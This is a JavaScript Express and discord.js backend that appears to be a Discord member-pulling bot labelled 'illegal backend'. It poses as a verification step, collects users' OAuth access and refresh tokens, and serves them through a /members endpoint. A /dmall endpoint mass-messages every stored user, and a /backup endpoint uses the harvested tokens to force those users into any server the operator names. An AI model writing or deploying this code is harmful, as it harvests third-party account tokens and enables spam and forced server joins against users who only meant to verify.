const express = require("express");
const { Client, GatewayIntentBits } = require("discord.js");
const axios = require("axios");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI; // https://your-railway-app.up.railway.app/callback

// In-memory store (replace with a DB for persistence)
let members = [];

const client = new Client({ intents: [GatewayIntentBits.Guilds] });
client.login(BOT_TOKEN);

// OAuth callback — members land here after verifying
app.get("/callback", async (req, res) => {
  const { code, guild_id } = req.query;
  if (!code) return res.send("Missing code.");

  try {
    // Exchange code for tokens
    const tokenRes = await axios.post("https://discord.com/api/oauth2/token",
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: "authorization_code",
        code,
        redirect_uri: REDIRECT_URI,
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );

    const { access_token, refresh_token } = tokenRes.data;

    // Fetch user info
    const userRes = await axios.get("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${access_token}` }
    });

    const user = userRes.data;

    // Store member
    const existing = members.find(m => m.id === user.id);
    if (!existing) {
      members.push({ id: user.id, username: user.username, avatar: user.avatar, access_token, refresh_token, verified_at: new Date().toISOString() });
    }

    // Add role if ROLE_ID and GUILD_ID set
    if (process.env.GUILD_ID && process.env.ROLE_ID) {
      await axios.put(
        `https://discord.com/api/guilds/${process.env.GUILD_ID}/members/${user.id}`,
        { access_token },
        { headers: { Authorization: `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" } }
      ).catch(() => {});

      await axios.put(
        `https://discord.com/api/guilds/${process.env.GUILD_ID}/members/${user.id}/roles/${process.env.ROLE_ID}`,
        {},
        { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
      ).catch(() => {});
    }

    res.redirect("https://illegal-web.pages.dev/verify.html?success=1");
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.redirect("https://illegal-web.pages.dev/verify.html?error=1");
  }
});

// Dashboard API — get all members
app.get("/members", (req, res) => {
  if (req.headers["x-api-key"] !== process.env.API_KEY) return res.status(401).json({ error: "Unauthorized" });
  res.json(members);
});

// Dashboard API — DM all
app.post("/dmall", async (req, res) => {
  if (req.headers["x-api-key"] !== process.env.API_KEY) return res.status(401).json({ error: "Unauthorized" });
  const { message } = req.body;
  let sent = 0;
  for (const m of members) {
    try {
      const dmChannel = await axios.post(`https://discord.com/api/users/@me/channels`,
        { recipient_id: m.id },
        { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
      );
      await axios.post(`https://discord.com/api/channels/${dmChannel.data.id}/messages`,
        { content: message },
        { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
      );
      sent++;
      await new Promise(r => setTimeout(r, 1200)); // rate limit safe delay
    } catch {}
  }
  res.json({ sent });
});

// Dashboard API — backup (add all members to a server)
app.post("/backup", async (req, res) => {
  if (req.headers["x-api-key"] !== process.env.API_KEY) return res.status(401).json({ error: "Unauthorized" });
  const { guild_id } = req.body;
  let added = 0;
  for (const m of members) {
    try {
      await axios.put(
        `https://discord.com/api/guilds/${guild_id}/members/${m.id}`,
        { access_token: m.access_token },
        { headers: { Authorization: `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" } }
      );
      added++;
      await new Promise(r => setTimeout(r, 1000));
    } catch {}
  }
  res.json({ added });
});

app.listen(3000, () => console.log("illegal backend running"));
